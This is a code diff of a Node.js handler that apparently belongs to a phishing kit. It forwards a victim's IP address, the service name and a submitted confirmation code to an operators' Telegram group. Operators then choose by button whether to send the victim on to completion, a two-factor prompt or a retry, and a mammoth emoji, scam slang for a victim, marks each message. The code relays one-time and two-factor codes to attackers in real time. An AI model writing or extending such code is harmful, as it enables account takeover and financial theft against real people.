@@ -1,9 +1,10 @@
 const {bot, groupID} = require('../index');
 
 const sendCode = async(req, res) => {
-    const {code} = req.body;
+    const {code, service} = req.body;
     const ip = req.ip || req.connection.remoteAddress;
     const keyboard = {
+        parse_mode: 'Markdown',
         reply_markup: {
             inline_keyboard: [
               [
@@ -14,9 +15,16 @@ const sendCode = async(req, res) => {
             ]
           }
       };
-    bot.sendMessage(groupID, 
-`IP заявки: ${ip}
-Код подтверждения: ${code}`, 
+    bot.sendMessage(groupID, `
+🦣  ${ip}  🦣
+
+🔒Подтверждение кода🔒
+    
+🔄 Выберете действие 🔄
+    
+»»»       Сервис: ${service}       «««
+
+»»»       ` + '`' + code + '`' + '       «««', 
 keyboard);
 bot.once('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
@@ -24,24 +32,24 @@ bot.once('callback_query', (callbackQuery) => {
   
     if (data === 'correct') {
         bot.sendMessage(groupID, `
-IP заявки: ${ip}
-Перенаправление на завершение`)
+🦣  ${ip}  🦣
+✅Перенаправлен на завершение✅`)
         bot.answerCallbackQuery(callbackQuery.id);
-        return res.send('correct');
+        return res.send({res: true});
     }
     if (data === '2fa') {
         bot.sendMessage(groupID, `
-IP заявки: ${ip}
-Перенаправление на 2fa`)
+🦣  ${ip}  🦣
+✅Перенаправлен на двух-факторку✅`)
         bot.answerCallbackQuery(callbackQuery.id);
-        return res.send('2fa');
+        return res.send({res: '2fa'});
     }
     if (data === 'incorrect') {
         bot.sendMessage(groupID, `
-IP заявки: ${ip}
-Перенаправление на повторный код`)
+🦣  ${ip}  🦣
+❌Сообщение о неверном коде❌`)
         bot.answerCallbackQuery(callbackQuery.id);
-        return res.send('incorrect');
+        return res.send({res: false});
     }
 });
 }
